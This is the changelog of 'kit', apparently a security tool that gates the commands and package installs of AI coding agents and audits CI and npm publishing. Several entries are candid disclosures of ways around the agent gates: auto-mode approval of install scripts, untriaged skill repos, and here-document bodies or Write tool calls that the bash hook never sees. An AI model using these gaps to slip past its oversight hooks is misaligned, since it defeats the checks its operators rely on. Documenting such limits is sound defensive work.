# Changelog

All notable changes to kit are documented in this file. This project adheres to [Semantic Versioning](https://semver.org/).

The format is based on [Keep a Changelog](https://keepachangelog.com/).

## [Unreleased]

## [6.6.5-rc.1] - 2026-08-19

A prerelease with one job: prove that publishing works over OIDC now that the npm token is
gone. It routes to the `next` dist-tag, so `latest` cannot move — nothing that came before
this could verify the switch, because the only honest test of a publishing credential is a
publish.

Its contents are the accumulated `[Unreleased]` work below, which will be listed in full
under `6.6.5` when that ships. Nothing in this prerelease is meant to be installed by anyone
who is not testing the release path.

### Changed

- **Publishing runs on trusted publishing (OIDC); the npm token is gone.** All 13 packages
  now carry a GitHub Actions trusted publisher naming `sandstream/kit`, `publish.yml` and the
  `npm-publish` environment, with the single permission `npm publish` — not staged publish,
  because the job publishes directly and least privilege is the point. `NODE_AUTH_TOKEN` is
  removed from both publish steps, which is what actually switches the credential: npm prefers
  a token whenever one is present, so the two cannot both be in effect. That also makes a
  re-added token a SILENT downgrade back to the credential npm is retiring, so
  `src/publish-workflow.test.ts` now fails if any executing line in the workflow carries one.
  The environment is no longer merely the guard around a secret — it is part of the credential,
  since npm only mints one for runs that reach it.

  Two things worth knowing for the next package, both learned the hard way: npm requires
  step-up 2FA (security key) per save and does **not** keep the session elevated, so it is one
  key tap per package and a timed-out prompt loses that save (nothing half-saves — retrying is
  free); and driving the UI quickly trips Cloudflare's bot check, which only a human can clear.

### Added

- **The `install-script grants` check now asks whether the granted package was ever
  triaged.** #475 deferred this on the grounds that no triage ledger existed to consult. That
  was wrong: `.kit-triage.jsonl` has been there all along — `kit triage` appends a PASS to it
  and the pre-commit `check-deps` gate reads it. The shape audit can only say how BROAD a
  grant is; this asks the question shape cannot answer, and the answers rank differently. A
  pinned grant for a package nothing has ever evaluated now warns at **high**, above an
  unpinned grant for one kit cleared yesterday. A grant whose only triage is older than the
  freshness window is reported separately, because "reviewed a month ago" and "never reviewed"
  are not the same claim. `TRIAGE_MAX_AGE_DAYS` is now exported and imported rather than
  copied, so `check-deps` and this check cannot drift to different windows.

  When the log is absent — most repos have never run `kit triage` — the row says the
  cross-check *did not run* instead of reporting every grant as untriaged. A confident finding
  built on an absent file is the failure mode this codebase keeps catching in itself. A torn
  append is skipped rather than allowed to fail the check.

- **`scripts/trusted-publishing-wizard.sh` — the npm OIDC migration, walked.** The
  registry side of trusted publishing can only be done in a browser, one package at a time:
  npm allows exactly one trusted publisher per package, and `npm access` on 11.19.0 covers
  status/collaborators/grant/revoke with no read or write path for the setting. So the wizard
  is honest about what it cannot verify and rigorous about the rest. It derives the package
  list from the repo rather than carrying a copy — a hardcoded list drifts the moment someone
  adds a plugin, and a *missed* package is the one failure this migration must not have, since
  no token plus no trusted publisher means that package's publish step fails. Progress is
  recorded in `.kit/trusted-publishing.state`, so it is resumable across sessions; the
  token-removal stage refuses to run until every package is confirmed; and the final stage
  points at a prerelease (routed to `next`, so `latest` cannot move) as the only honest test.
  Its `publish.yml` edit is fail-closed — it removes the parent `env:` when the token was its
  only child, refuses if any *executing* line still references `NPM_TOKEN`, and lists the
  comment lines that still describe the token so the prose is fixed in the same PR.
- **A dialect gate for that script (`src/wizard-script.test.ts`).** Nothing in this repo lints
  shell — `lint` and `format:check` are TypeScript-only and CI has no shellcheck — so a
  committed wizard could be broken in ways no gate notices until the human runs it, during a
  credential migration, once. Two such bugs were found by hand while writing it and are now
  pinned: `mapfile` (a bash 4 builtin; macOS ships bash 3.2.57 and the publishing machine is a
  Mac) and `sed -E '…+?…'` (POSIX ERE has no lazy quantifier — macOS sed exits with
  "repetition-operator operand invalid"). Both parse fine to the eye and to `bash -n`. The
  gate was mutation-tested by reintroducing each.

### Fixed

- **A second gate that could not fail: the security-headers step.** `security.yml` read
  `if grep -rE "Content-Security-Policy|…" src/ packages/ | head -1; then` — `head` exits 0 on
  empty input, so the condition was always true, `Security headers configured` printed
  unconditionally, and the `::warning::` branch was unreachable. Measured against a
  guaranteed-absent pattern before fixing. Same class as the 6.6.4 tag-signature gate, and
  found by the rule that fix installed.
- **`R1-fail-open-ci` now names the class instead of the instance.** It flagged a condition
  piped into `tee` or `cat`; it now flags any condition whose pipeline ENDS in a status-blind
  sink (`tee`, `cat`, `head`, `tail`, `wc`, `sort`, `uniq`, `tr`). `grep -q` stays allowed —
  there the pipe's last command IS the question. Adding the rule made kit's own self-audit
  fail on `security.yml`, which is how the second instance surfaced.

### Changed

- **The security-headers check is now honest, not merely correct.** kit is a CLI + MCP (stdio)
  tool — the same "no HTTP surface" that skips Stage 3 DAST — so a missing CSP is not a
  finding here, and a permanently-expected warning would only train people to ignore warnings.
  The check is gated on an HTTP surface actually existing (`createServer`, `express(`,
  `fastify(`, `Bun.serve`, `.listen(` — each matching 0 lines when written) and fires the day
  one lands. All three branches were driven in a fixture tree; the two that mattered had never
  been reachable.

## [6.6.4] - 2026-08-18

### Added

- **`kit check` audits npm's install-script grants.** npm no longer runs a dependency's
  `preinstall`/`install`/`postinstall`/`prepare` unless `package.json`'s `allowScripts` names
  it, which makes that field the standing record of which dependencies were handed
  install-time code execution. The new `install-script grants` check (CWE-829) reads it and
  flags the two shapes that outlive their review: a **bare-name or range key**, which also
  covers the release nobody has seen yet, and a **stale grant** for a package the manifest no
  longer depends on — a standing permission for a name an attacker can re-introduce
  (`npm install-scripts prune` clears those). A field shape npm does not write is reported as
  `didNotRun` rather than read as "no grants", because treating an unparseable allowlist as
  empty would report the most dangerous state as the safest one. The shapes were measured
  against npm 11.19.0, not taken from the docs page, which describes `{pkg: "1.2.3"}` while
  the client actually writes the version into the key: `{"esbuild@0.28.1": true}` pinned,
  `{"esbuild": true}` unpinned, `{"esbuild": false}` denied.

- **`docs/RELEASING.md`** — how a release is cut, what the publish job refuses to publish,
  and the migration off a long-lived npm token, including the 13 per-package trusted-publisher
  configurations that migration needs and the two constraints (`workflow_call` breaks npm's
  validation; self-hosted runners are unsupported).

### Fixed

- **The publish job's tag-signature gate was fail-open, and `v6.6.3` shipped unsigned.**
  The step read `if ! git verify-tag "$TAG" 2>&1 | tee /tmp/tag-verify.log; then` — `git`
  exits 1 on an unsigned tag, but a pipeline reports its LAST command, and `tee` always
  exits 0. GitHub's default step shell is `bash -e {0}`, which does not set `pipefail`, so
  the condition was never true: the gate could not fail, and every GPG control around it
  (the pinned `MAINTAINER_KEY_FPR`, the single-key keyring check, the ownertrust import) was
  intact and useless. `v6.6.3` was tagged with `git tag -a` and published; `git tag -v
  v6.6.3` prints `error: no signature found`. Re-signing it would mean force-pushing a
  published tag, which re-triggers the publish workflow against a version already on the
  registry, so the tag stands and `docs/VERIFY.md` records why. Fixed with `set -o pipefail`
  and a redirect instead of the pipe; `src/publish-workflow.test.ts` asserts the verdict
  cannot come from a pass-through sink, and both assertions were mutation-tested by
  reintroducing the pipe.

- **Self-audit `R1-fail-open-ci` now catches the class, not just `|| true`.** A condition
  piped into a pass-through sink (`tee`, `cat`) takes its status from the sink, so the rule
  flags it unless the step actually sets `pipefail`. "Actually" is load-bearing: the first
  implementation walked back looking for the word and was satisfied by the fixed step's own
  explanatory comment — documented rather than enforced, the same disease the rule exists to
  catch. A pipe whose last command IS the question (`if cmd | grep -q x`) is left alone.

### Changed

- **The install gate holds install-script approval, not just installs.** `npm approve-scripts
  <pkg>` and `npm install-scripts approve <pkg>` are the moment an already-installed
  dependency gains arbitrary code execution — the exact decision the gate exists to hold —
  and neither was matched, so an agent in auto-mode could grant it unchecked. Both spellings
  now triage the named package like an install target; `--all` / `-a` and the bare
  interactive form name nothing and fail closed; `pnpm approve-builds` is covered the same
  way. The read-only faces are deliberately never blocked — `install-scripts ls`, `deny`,
  `prune`, `--dry-run` and `--allow-scripts-pending` hand out no permission, and blocking the
  review step would push an agent straight to `--all`.

- **The supply-chain check's install-script advice names the review, not the skip.** It said
  "install with `npm ci --ignore-scripts` where possible"; skipping is npm's own default now,
  so that described what already happens. It now points at `npm install-scripts ls` and a
  per-package pinned grant, never `--all`.

- **The publish job installs `npm@^11.5.1` before anything else.** npm's OIDC trusted
  publishing — the migration target now that 2FA-bypass tokens lose direct publish rights
  (~January 2027) — exists only in npm ≥ 11.5.1 on node ≥ 22.14.0, and `actions/setup-node`
  ships npm 10.9.x for node 22. Verified against this repo on npm 11.19.0 before wiring:
  `npm ci` and `npm publish --dry-run` behave identically, and npm's skip-install-scripts
  default costs nothing here (esbuild's postinstall is the only one in the tree; build and
  tests pass without it). `src/publish-workflow.test.ts` asserts the step exists, clears the
  version floor, and precedes every publish — a comment cannot fail CI, and a publish job
  runs only on a tag push, the worst moment to learn the client is too old.

- **`kit init` generates only what the repo proves — and asks about the rest.** The
  operator's `~/.kit/defaults.toml [init] services` were appended to every new project, so a
  repo with no PostHog got a `[services.posthog]` block and three POSTHOG keys, and the
  framework table handed `verify = "pnpm build"` to repos that use npm. A plausible generated
  value is worse than an absent one: an absent line is a question, a plausible line looks
  like a decision somebody made, so nobody re-reads it. `known_services` is now a menu —
  detected services are written, known-but-absent ones come back as `offered` and are put to
  whoever can answer — `generateToml` returns `{ toml, gaps }` where every declined field
  carries the command that settles it, and the old `services` key still reads with a rename
  notice. `promptMultiSelect` returns `null` rather than a default when nobody is there,
  which is why it exists beside `promptSelect`, whose "answer with the recommended option"
  convention had been silently choosing a secret backend on every agent and CI run. Also:
  `bun.lock` now counts as bun (the 1.2 rename to the text lockfile made every current bun
  repo detect as npm), and the build refuses to run on cloud-sync conflict copies instead of
  hiding them behind a `tsconfig` exclude that never matched.

- **`kit_check` over MCP answers the question and offloads the rest.** The standing MCP
  surface is paid once per session (7,788 chars); a `kit_check` response is paid on every
  call, and an agent in a check → fix → check loop calls it repeatedly. The response is now
  the verdict plus every non-passing row — 9,799 → 3,210 chars, **67% off per call** — with
  the complete run written to `.kit/runs/check-<stamp>.json` and returned as `detail.path`
  (`detail: true` still returns the whole document inline). Two invariants bound the saving:
  only `pass` rows may be omitted, so a `skip` or `didNotRun` always survives and omitted
  passes stay counted; and `scope` is carried verbatim, so a `--category`-narrowed green
  cannot read as a whole-repo green. A failed detail write returns no reference at all — a
  verbose answer beats a dangling pointer. `scripts/measure-mcp-output.mjs` reproduces both
  numbers.

## [6.6.3] - 2026-08-13

### Fixed

- **A `/root/…` hook path is no longer called stale on a machine whose home IS `/root`.**
  The gate-liveness diagnostic returned on the `/root/` prefix alone, before reaching the
  executability check, so on a root container — where agents commonly run — kit reported a
  hook command as unable to "reliably start" while that same path started fine, and advised
  rewriting hooks for `/root` when `/root` is where they already pointed. `kit check` failed
  on it, which made `kit setup` exit 1. The 6.6.1 case the check exists for is unchanged: a
  path generated in a root sandbox and carried to a normal account, where `/root` is not home
  and the file is unreachable. A genuinely broken `/root` path on a root machine is still
  caught, by the executability check the early return used to skip.
- **Two tests stated a claim that depended on who ran them.** Three gate-liveness tests
  asserted the `/root` behaviour while inheriting the runner's `$HOME`, and the WAL-sidecar
  fallback test established its precondition with `chmod 0o500` without checking whether it
  took — root writes through `0500`, so the precondition silently did not exist and the test
  reported that as the fallback being broken. The gate-liveness tests now pin `$HOME` to name
  the machine they describe, and the WAL test probes with a real write and skips loudly when
  the mode does not deny. Verified the skip does not mask: as a non-root user the guard does
  not fire and the test runs and passes.

## [6.6.2] - 2026-08-10

### Added

- **`kit browser doctor` — verification-readiness diagnostics.** Reports which browser
  strategy a repo actually gets (Playwright, system Chrome, CDP) or the blocker standing
  in the way, plus `kit browser status`, `kit browser cdp-url`, and
  `kit browser playwright-env` for wiring test runners. `--json` on each.

- **Secret findings you have reviewed can now be accepted by name — `.kit-secretsignore`.**
  Git history is immutable, so a test fixture or doc placeholder committed once is a
  finding forever, and `secrets scan` sat at `warn` permanently. A warning with no
  reachable green state is one nobody reads, which is how a real finding gets missed.
  Entries are `<commit>:<file>:<detector>`, one per line. Two properties keep it safe:
  an entry names a single commit, so it can never wave through a future occurrence of
  the same string, and a **verified-live** finding is never ignorable no matter what is
  listed. See `docs/COMMANDS.md` → "Secret findings".

### Fixed

- **The secrets scan now classifies example credentials instead of asking you to
  re-review them every run.** Findings whose own value proves they name nothing real —
  an unreachable host (loopback, a bare compose/k8s service name, `.internal`,
  `example.com`) or a placeholder secret (`pass`, `password`, `changeme`, a vendor's
  published doc sample) — are counted in their own bucket rather than as reviewable
  findings. Keyed strictly on the value, never the file path: a real credential pasted
  into a test file is still flagged, and a verified-live finding is never waved through.
- **`npm test` refuses to run when build output holds cloud-sync duplicates.** In a
  synced checkout (iCloud Drive), a conflicted file gains a ` 2` twin; under `dist/`
  that twin is a stale compiled test running old assertions against new code — it can
  fail a correct change, or pass a broken one. The runner now names the files and stops
  instead of reporting a verdict it cannot trust.
- **A skill installer's actual payload is now triaged, not just its wrapper.**
  `npx skills@latest add <owner>/<repo>` triaged only the npm wrapper, passed, then
  cloned an untriaged third-party repo into `~/.agents/skills` globally — the same
  fetch-and-execute blind spot `create-*` already closes, one level deeper. When a
  fetched package is a known repo fetcher, its `owner/repo` argument is now triaged too.
- **The gate no longer triages a registry package `npx` would never fetch.**
  `npx tsc --noEmit` was 23% of kit guard's would-block observations, gating npm's
  unrelated abandoned `tsc` package — but npx resolves the plain positional from local
  `node_modules/.bin` first, so nothing is fetched. A plain `npx <name>` / `bunx <name>`
  whose binary exists locally is now dropped; a `-p`/`--package`/`--from` target is
  still always gated, because npx fetches that one unconditionally.
- **Concurrent agent startups no longer produce phantom `TRIAGE FAILED` verdicts.**
  The bundled triage skill was refreshed with an in-place truncate-then-write, so
  several agents starting at once could read a half-written `triage.py` and crash with
  no real verdict behind it. The refresh is now atomic (write to a temp file, rename).
- **The memory store opens read-only when its WAL sidecars cannot be created.** The
  fallback was keyed on one SQLite error string, so a build that words the identical
  precondition differently ("attempt to write a readonly database") never took it, and
  `checkMemoryInjection` returned warn instead of pass. It now keys on the actual
  precondition — sidecars missing — not on the wording.
- **`kit statusline` help distinguishes setup gaps from open action items**, and states
  that Codex receives the same line via SessionStart context rather than a status bar.

## [6.6.1] - 2026-08-06

### Fixed

- **Repo-shared hook commands no longer bake in the machine that generated them.**
  `kit agent-config`'s gate-hook command generator wrote the absolute wrapper path
  (`homedir()`-resolved at write time) into `.claude/settings.json` and
  `.codex/config.toml`. A hook command produced on one machine (or a `HOME=/root`
  sandbox) and carried to another fails every gated tool call with an
  undiagnosed `exit 127`. The generator now emits the wrapper via `"$HOME/.kit/bin/kit"`
  in these command strings; `expandHomePath` resolves `$HOME`/`${HOME}` on read so
  drift detection keeps working. `kit agent-config` is also now self-healing: if a
  gate hook is already wired but its command string doesn't match the desired
  form, it rewrites it in place instead of only reporting "already wired". Codex's
  `.codex/config.toml` gate commands are now parsed and included in
  `kit check`'s gate-liveness diagnostics — previously only `.claude/settings.json`
  was inspected, so a broken Codex hook passed silently.

## [6.6.0] - 2026-08-06

### Added

- **`kit check --category deploy` verifies declared deploy environment keys against
  the platform, without reading secret values.** Projects can declare required
  Vercel env names per environment in `[deploy.vercel.environments.<env>]`; kit
  lists remote key names, reports missing keys, flags cross-environment drift, and
  calls out build-time variables such as `NEXT_PUBLIC_*` that need a redeploy after
  changes. `kit fix` reuses the existing propagate path when a missing value is
  available from `[secrets.keys]`, and emits a structured human-in-the-loop block
  when auth, vault access, or provider setup must be completed by a person.

- **Declarative standards plugins can now express required patterns, not only
  forbidden ones.** `mode = "require"` checks that every scoped file contains a
  required file-level pattern, while `mode = "forbid"` remains the default
  line-match behavior. Require rules support the same schema validation,
  ReDoS-prone regex rejection, severity handling, and net-new baseline gating as
  forbid rules.

- **Managed agent config now has an explicit opt-in personal profile extension.**
  `[agent_config.user_rules]` can point at a user-level Markdown file or directory,
  bounded by line and byte caps, and the same managed text is written to every
  supported harness file. kit warns when personal prose looks like a deterministic
  gate that should move into `.kit/standards.d`.

### Changed

- **Standards plugin excludes are more tolerant and louder.** An exclude pattern
  ending in `/` now means the whole subtree, so `scripts/` matches
  `scripts/x.ts`; plugins also warn when an exclude or require scope matches zero
  files in the repo.

- **Agent-facing output is more actionable for setup gaps.** `kit check` and
  `kit fix` now format auth, secret-backend, scanner-setup, and deploy-provider
  blockers as human-in-the-loop instructions with owner, reason, exact next steps,
  verification command, and what the agent should run after the human action.

### Fixed

- **`kit hooks install` no longer dead-ends when `[hooks]` is absent.** The no-op
  message now points to `kit hooks add <name>` and lists the built-in hook
  templates, so users can discover `secret-scan`, `post-pull-audit`, and
  `context-check` from the command that failed to install anything.

- **Hook diagnostics now identify machine-local spawn problems.** Managed agent
  config and security checks detect bare `kit`, non-absolute executables,
  stale/root-owned wrapper paths, and malformed managed wrappers before they
  become repeated harness-level `command not found` or spawn failures.

## [6.5.0] - 2026-08-05

### Added

- **`kit memory install` now wires Codex lifecycle hooks, not only Claude Code.**
  It non-destructively merges `UserPromptSubmit`, `SessionStart`, and `SessionEnd`
  into `~/.codex/hooks.json`, preserves unrelated hooks and metadata, backs up an
  existing file, and removes only kit-owned handlers on uninstall. New Codex
  command hooks remain inactive until reviewed through `/hooks`, matching Codex's
  trust boundary. The Codex `SessionEnd` handler carries its harness through the
  detached worker so it indexes the just-ended rollout immediately; it does not
  silently take the old Claude-only fast path. Separate durable markers extend
  `kit check` / `kit doctor` liveness detection across both harnesses.

### Fixed

- **A guard shim could ping-pong with another shim manager's shim and never run the
  tool.** ([#461](https://github.com/sandstream/kit/issues/461))
  The shim resolved the real tool by scanning `PATH` and skipping exactly one
  directory: its own. On a machine where the next `PATH` entry belongs to another
  shim manager (mise, asdf, rtx, pyenv, rbenv), that manager applies the same rule —
  and when it has no version active for the current directory it falls through to a
  `PATH` lookup, which lands back in kit's shim, which hands off again. Four
  `~/.kit/shims/npm` processes were found alive on a dev machine, two of them 5 and
  7.5 hours old, each burning ~20% CPU and re-spawning `kit guard-observe` about once
  a second, with the wrapped command never run and no output at all. `sh -x` named
  the hand-off; the discriminating test was that mise's shim answers immediately once
  `~/.kit/shims` leaves `PATH`. `KIT_GUARD_BYPASS=1` did not help — it skips the
  observation, not the hand-off — so the guard's core promise ("never blocks; kit
  unavailable ⇒ unchanged behavior") was inverted into an indefinite block.

  A hand-off into a shims directory now removes kit's own directory from the
  exported `PATH` first — every occurrence, trailing slash tolerated — so the
  receiving manager cannot resolve back into us, and marks the hand-off in a
  per-tool variable (`KIT_GUARD_ACTIVE_NPM`); if the shim is re-entered anyway it
  resolves past every shims directory instead of spinning. A hand-off to a real
  binary is unchanged: `PATH` and the environment are left alone, so what the tool
  spawns is still observed. The version manager keeps choosing the binary — kit hands
  off *through* it, never past it, which a test pins with a decoy `npm` further down
  `PATH`. Measured on the reporting machine with its real mise shims and mise in
  fall-through mode: the old shim was killed after 8s having printed nothing, the new
  one answers `11.11.0`; with mise owning node for the directory, both resolve the
  same `10.9.8`. Six of the guard tests now execute the generated `sh` for real, so
  this class of hang fails a test instead of hanging a machine.

- **An upgraded kit next to an old shim was still a broken machine.** Shims are files
  on disk, written once by `kit guard install`, and nobody re-runs that after an
  upgrade — so the fix above would have reached only new installs. `kit guard-observe`
  now rewrites the shim that called it when that file does not match the running kit
  version, and `kit guard status` names any shim that predates it. Shim writes became
  a rename onto the path instead of a truncate in place: `sh` reads a script as it
  executes it, so rewriting a shim mid-run would splice the file under the running
  shell — the rename leaves that process on the old inode. Foreign files at a shim
  path are still never touched.

## [6.4.2] - 2026-08-04

### Fixed

- **The bypass banner counted commits that landed nowhere.**
  `.kit-skipped-commits.jsonl` is append-only and the banner counted its LINES, so
  a squash-merge — which keeps the change and discards the commit it recorded —
  left the banner reporting a sha no ref contains, on every `kit` invocation,
  forever. This repo's own log held three such entries. A warning that cannot go
  down is a warning nobody reads, and this banner is the only control that makes a
  `git commit --no-verify` visible after the fact. The count is now the entries the
  repository still recognises: an entry is set aside only when git can DISPROVE it
  (the object resolves and no ref contains it), while anything unverifiable — a log
  carried between clones, an object gc'd away, a directory that is not a repository
  — stays counted. `rev-list` is asked for `--all HEAD` rather than `--all`, so a
  detached HEAD (mid-rebase, mid-bisect, exactly when a fresh commit has no branch
  yet) is not read as orphaned, and set-aside entries are stated in the banner
  rather than silently dropped. The classification rule sits behind an injected
  probe; the tests were verified to have teeth by patching the compiled partition
  back to the old behaviour, which killed 5 of the 10, both end-to-end CLI cases
  among them. `docs/THREAT_MODEL.md` states the rule under Bypass detection.

- **`hono` is pinned to 4.12.34 through `overrides`.**
  `@modelcontextprotocol/sdk@1.30.0` resolved `hono` twice — directly and via
  `@hono/node-server` (`hono: ^4`) — and both landed on 4.12.31, inside the
  vulnerable range of GHSA-8j4g-w8fx-2239 (ReDoS in the CORS middleware). 1.30.0
  is the latest SDK, so there was no upstream fix to wait for. An `overrides` entry
  rather than a direct dependency, because kit never imports hono and the declared
  runtime surface should not grow to raise a range. Note what this does and does
  not do: it constrains kit's own tree and its gates (`npm audit` and osv-scanner
  both clean afterwards); npm ignores a published package's `overrides`, so
  consumers resolve `^4` themselves and currently land on a patched 4.13.x.

- **The MCP test client inherited a 60s deadline it could not meet.** A full-suite
  run failed with `MCP error -32001: Request timed out` at 60003ms, while its
  sibling passed the same run at 59784ms — 216ms inside the same cliff. Both call
  `kit_check` against the server's own repo, which is the point of the pair, so
  neither can be pointed at a cheap fixture: each runs a full check that takes
  ~25-46s alone and longer beside another test file at `--test-concurrency=2`. The
  test client now supplies a 150s default per request, set in the harness because
  the SDK takes the timeout per request — so the next real-repo call cannot
  re-earn the flake — and kept under the runner's own `--test-timeout=180000` so a
  genuine hang is still bounded. Verified in the failing direction: under load the
  two tests fail at exactly 150000ms rather than 60000ms.

- Three shared-memory entries: `overrides` over a new dependency for a
  transitive-only advisory, proving a raised timeout by making it fail at the new
  number, and pruning-needs-proof for append-only audit logs.

## [6.4.1] - 2026-08-04

### Fixed

- **`npm test` deleted the developer's real MCP tokens.**
  `src/mcp-orchestrator.test.ts` operated on `~/.kit/mcp-tokens.json` — the actual
  path, not a fixture — and calls `rmSync` on it before every test and in
  `afterEach`. It had no choice: `mcp-orchestrator.ts` bound `TOKEN_FILE` to
  `homedir()` in a module-level `const`, so no test could redirect it. Measured
  both ways: with a sentinel file at that path, the old code left
  `No such file or directory` behind and the fixed code leaves the sentinel
  untouched. The path now resolves per call and honours `KIT_MCP_TOKENS_DIR`,
  matching `identityDir()` / `KIT_AUDIT_ANCHOR_DIR` / `KIT_MEMORY_DIR`, and the
  test redirects into a temp dir. Also listed in `kit knobs`.

- **A failing test could lose its own name.** A run of the suite reported
  `# fail 1` while piped through `tail`, which discarded everything above the
  summary; four re-runs were green, so the flake was never named. `npm test` now
  always writes a complete TAP report to `.kit-test-run.tap` (gitignored) in
  addition to stdout, so the detail no longer depends on how the caller redirected
  output. Proven by failing a test on purpose and reading the name out of the log
  while stdout was piped to `tail -1`. The stdout reporter deliberately reproduces
  node's own adaptive default (`spec` on a TTY, `tap` when piped) rather than
  forcing one, because naming a reporter replaces that default and would have
  silently broken `npm test | grep '# fail'`.

  The intermittent failure itself is **still unidentified** — eight clean full runs
  since. One later run showed 75 failures with whole test files erroring, but that
  was self-inflicted: `dist/` was rebuilt while the suite was running.

## [6.4.0] - 2026-08-04

### Added

- **`[policy.agent_writes]` now reaches the plugin write surfaces — the last
  ops with no choke point in kit.** `resolve_issue`, `create_release` and
  `trigger_deploy` were the three ROADMAP named; the arc registered and gated
  every mutating plugin surface instead, adding `env_unset` (separate from
  `env_set` because setting a variable is recoverable by setting it again while
  deleting one destroys the only copy of a value and takes down whatever reads
  it), `api_token_revoke`, `webhook_create`, `webhook_delete`, and
  `scoped_key_revoke` — a third Supabase op that was in neither the
  elevation-scope split nor the registry, because `secrets-rotate-cli.ts` only
  ever asks about `--mode`.

  The plugins are standalone zero-dependency packages that must not import
  kit-core, so the enforcement point cannot be a kit function call. What
  crosses the boundary is the resolved DECISION, not the config: kit runs every
  registry op through the one `policyDecision` and exports the refusals as
  `KIT_POLICY_DENY` (`installPolicyEnv`, called from `main()` beside
  `installPolicyHash`, and extracted from the boot block so that dropping
  either install fails a test). The plugin-side guard is a membership test with
  no rule in it — nothing to collapse, no empty list to misread, no
  absent-vendor case to get backwards, because all four states resolved before
  the value was written. Serialising the config instead would have put seven
  independent copies of the four-state rule in seven packages.

  Two limits, stated rather than implied: the channel is exactly as strong as
  the `KIT_READ_ONLY` contract and no stronger — a process that never ran kit
  sees no denials, and absence must mean "no denial" or every repo not using
  the block goes offline the moment a plugin runs outside a kit invocation — and
  a plugin-side refusal is not audited, because a plugin has no path to the
  governed project's log. `enforcePolicy()` still audits the ops kit gates
  itself.

### Fixed

- **`kit-plugin-supabase` honored no containment gate at all — including on the
  JWT-secret roll.** Its three write surfaces (`rollJwtSecret`,
  `revokeScopedKey`, `mintScopedKey`) had no `assertNotReadOnly()`, while all
  six sibling plugins did, and `cli.ts` + `THREAT_MODEL.md` both stated that
  read-only was honored by "every kit-plugin write surface". Measured with
  `KIT_READ_ONLY=1` set in the process and the client pointed at a local
  listener: all three sent their request, and the roll — which invalidates
  every anon, service_role, signed-URL and session token at once — returned a
  rolled secret. The guard is inline per package because plugins must not
  import kit-core, so `src/plugin-write-gates.test.ts` now pins all seven
  copies byte-identical and derives the write surfaces from the plugin sources:
  any function issuing a mutating request, or building a GraphQL `mutation`
  routed through a shared transport, must carry both guards, in the documented
  order, naming an op the registry knows. Exemptions are listed with reasons
  and asserted to still match something. Mutation-proved seven ways (drop
  either guard, swap their order, gate the token revoke on `env_set`, add a new
  ungated mutation through the transport, loosen one plugin's read-only test to
  `"1"` only, remove the registry row the revoke depends on — 1 fail each).

  The seven changed plugins are bumped to **0.1.1**, and that bump is part of the
  fix rather than bookkeeping: `publish_ws` in `publish.yml` skips any package
  whose version is already on npm, so a containment fix left at 0.1.0 would ship
  to the monorepo and leave every installed copy vulnerable — the same way the
  scanner plugins existed but were unreachable to anyone who had not cloned the
  repo until 6.3.1 put them on npm.

- **`unknownPolicyEntries()` reported to nobody.** `config.ts`,
  `docs/OWASP_2025.md`, ROADMAP and CHANGELOG all described it as surfacing an
  `[policy.agent_writes]` entry that names an op kit never asks about; it had
  no production caller. Measured: a repo with `vercel = ["env-set"]` produced a
  full `kit check` mentioning neither the typo nor its consequence, exit 0 —
  and the typo INVERTS the operator's intent, because declaring the vendor
  refuses every op not listed, so a misspelling turns a pre-approval into a
  blanket denial for that vendor. This is trap 5 of the enforcement arc ("tests
  over the decision function are not evidence of a working control") recurring
  one module later. Now the `policy agent-writes` row
  (`src/check-policy-ops.ts`), wired into `checkSecurity()` rather than
  `runCheckGate` so `kit ci` and `kit heal` see it too; it names the real ops
  for the vendor, states the consequence, and on the clean path reports how
  many of the registry's ops the policy refuses. Mutation-proved: removing the
  wiring fails only the wiring test while all six function-level tests keep
  passing, which is precisely why they were not enough.

- **`kit knobs` advertised an op the registry rejected.** The knob description
  read `sentry = ["resolve_issue"]` while `resolve_issue` was not in
  `POLICY_OPS`, so kit's own help text described config kit's own checker
  flags. The drift test written for exactly this class hard-coded `config.ts`;
  it now scans every source file that mentions the block. The historical
  examples in `config.ts` / `policy.ts` are cited by op name instead of in the
  live `vendor = [...]` syntax, because a past example written in the current
  syntax is indistinguishable from a live one to any scanner.

- **The plugin test suites never ran.** `scripts/test.mjs` collected only the
  root `dist/`, so 11 compiled test files and 76 tests under
  `packages/*/dist/` — including every `KIT_READ_ONLY=1` refusal test the
  plugins do have — had never been executed by `npm test` or CI. They pass;
  nobody was watching. A containment test that does not run is worse than no
  test, because it reads as coverage.

- **`gate-bash` read here-document bodies as commands, and blocked kit's own PR
  description.** `SEGMENT_SPLIT` includes `\n`, so every line of a here-document
  was scanned as its own command. Measured: a `gh pr create --body "$(cat <<'EOF'
  … EOF)"` whose body contained the prose `` `npx tsc --noEmit` `` was refused
  with `BLOCKED — Triage: npm tsc`, because a backtick in a sentence became a
  nested command. A false block in a security gate is not a harmless annoyance —
  it is what teaches people to pass `--no-verify`, and this repo already carries
  one bypassed-hook record.

  `splitHeredocs()` now separates body from command following what the shell
  actually does: a body fed to a shell (`bash <<EOF`, `cat <<EOF | bash`) or
  written to a `*.sh`-shaped file is scanned as a script; anything else is data.
  The exception that keeps this from being the cheap fix: with an **unquoted**
  delimiter the shell performs command substitution while building the document,
  so a substitution in the body really runs and is still gated, while the same
  body under `<<'EOF'` is inert text. An unterminated here-document is scanned
  rather than trusted, and the terminator is matched leniently, because absorbing
  the commands that follow it is the one error direction that could hide a real
  install.

  Verified by driving the real hook rather than the parser: the exact payload that
  blocked the PR now exits 0, while `bash <<EOF`, `cat <<EOF | bash`, the
  unquoted-substitution form, script authoring and the plain install all still
  exit 2. `src/install-gate-heredoc.test.ts` pins both sides of that table —
  mutation-proved seven ways, including the cheap fix of treating every body as
  data (3 fail), dropping the unquoted delimiter's substitutions (2), treating a
  quoted delimiter as expanding (2), and failing to find the terminator (4).

  Named limitation, previously covered only by accident: a body written to a file
  without a shell-script extension and executed later is invisible to this gate,
  as is the easier spelling of the same bypass — a `Write` tool call, which
  `gate-bash` never sees.

- **The dependency-surface numbers said 120 installed; the tree is 94.** The
  count was measured against the SDK 1.29 tree and never re-measured after the
  1.30 bump moved it (`@hono/node-server` 1.x → 2.x). It had been copied into
  four places — the ROADMAP heading and body, `docs/DATA_FLOW.md`, the OWASP A06
  row, and the guard test's own docstring — so the number was wrong everywhere it
  was cited, including in a draft aimed at an upstream maintainer. Re-measured at
  1.30.0: **94 production packages, 90 of them reachable only through the MCP
  SDK, 9 loaded at runtime.** The loaded count did not move, which is why it is
  now **gated**: `mcp-dependency-surface.test.ts` parses the ROADMAP heading and
  fails if the advertised number and the trace disagree (mutation-proved by
  editing the heading to 8 → 1 fail). Only the loaded count is pinned — the
  install count depends on lockfile hoisting, so pinning it would fail on an
  unrelated bump and teach people to edit the assertion instead of reading it.

